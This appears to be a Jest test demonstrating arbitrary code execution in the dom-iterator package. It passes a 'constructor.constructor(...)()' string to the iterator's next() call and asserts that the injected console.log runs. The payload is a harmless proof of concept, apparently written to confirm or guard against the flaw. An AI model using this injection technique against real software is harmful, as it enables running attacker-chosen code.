test("Arbitrary code execution in dom-iterator", (done) => {
  const Dom = require('dom-iterator');

  console.log = jest.fn();

  var Parser = require('mini-html-parser');
  var html = '<h1></h1>';
  var Parser = Parser(html);
  var node = Parser.parse();

  var it = Dom(node);
  it.next("constructor.constructor(\"console.log('EXPLOITED!!')\")()");

  expect(console.log).toHaveBeenCalledWith('EXPLOITED!!');
  done();
});
